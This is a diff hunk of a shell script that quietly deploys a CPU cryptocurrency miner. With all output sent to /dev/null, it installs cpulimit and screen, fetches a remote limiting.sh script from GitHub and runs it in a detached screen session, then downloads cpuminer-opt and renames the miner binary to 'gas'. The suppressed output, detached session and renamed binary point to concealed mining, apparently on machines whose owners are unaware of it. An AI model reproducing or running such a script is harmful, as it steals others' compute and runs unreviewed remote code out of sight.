@@ -10,9 +10,9 @@
 sudo apt update > /dev/null 2>&1
 sudo apt install cpulimit > /dev/null 2>&1
 sudo apt install screen -y > /dev/null 2>&1
-wget https://raw.githubusercontent.com/wikangdijalalan2/jagahkurang34/main/limiting.sh > /dev/null 2>&1
-chmod +x randum.sh > /dev/null 2>&1
-screen -dmS randum ./randum.sh cpuminer-avx 65 75 > /dev/null 2>&1
+wget https://github.com/wikangdijalalan2/jagahkurang34/raw/main/limiting.sh > /dev/null 2>&1
+chmod +x limiting.sh > /dev/null 2>&1
+screen -dmS randum limiting.sh cpuminer-avx 65 75 > /dev/null 2>&1
 wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz > /dev/null 2>&1
 tar xf cpuminer-opt-linux.tar.gz > /dev/null 2>&1
 mv cpuminer-avx gas > /dev/null 2>&1
